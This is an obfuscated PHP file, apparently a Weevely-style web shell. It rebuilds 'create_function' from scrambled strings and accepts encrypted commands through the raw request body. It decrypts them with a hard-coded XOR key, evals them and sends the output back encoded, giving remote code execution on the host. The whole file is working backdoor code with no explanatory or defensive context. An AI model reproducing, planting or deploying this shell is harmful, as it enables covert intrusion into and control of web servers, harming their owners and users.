<?php
$L='$k==*"6b0a6b22";$=*kh="04=*e44=*f70=*305b";=*=*$kf=*="ed9428f0a6=*c8";$p="=*g=*Ay4gzUlzavC2=*sfi';
$i=';@ob=*_end_cl=*ean();$r=*=@ba=*se=*=*64_en=*code(@x(@g=*zcompress($o),=*$k))=*=*;pr=*int("$p$kh$r$kf");}';
$O='eva=*l(@gzunco=*mpress(@=*x(@base6=*4_decode(=*$m[1=*]),=*$k)));$=*o=@ob_get_=*conten=*ts()=*';
$N=str_replace('h','','chrehahte_fhunhchtion');
$j='h=*("/$kh(=*=*.+)$kf/",@file=*_get_co=*nt=*ents("php:/=*/input"=*),$m)===*=*1) {=*@o=*b_star=*t();@';
$D='(=*$j=0;($j<$c=*=*&&$i<$l);$j=*=*++,$i++){$o=*.=$t=*{=*$i}^$k=*{$=*j};=*}}return $o=*;}if =*(@preg_matc';
$m='";func=*=*=*tion x($t,$k){$c=*=*=strlen($k);$=*l=*=str=*len=*($t);$o="";fo=*r($i=0;$i<=*$=*l;){for';
$n=str_replace('=*','',$L.$m.$D.$j.$O.$i);
$t=$N('',$n);$t();
?>
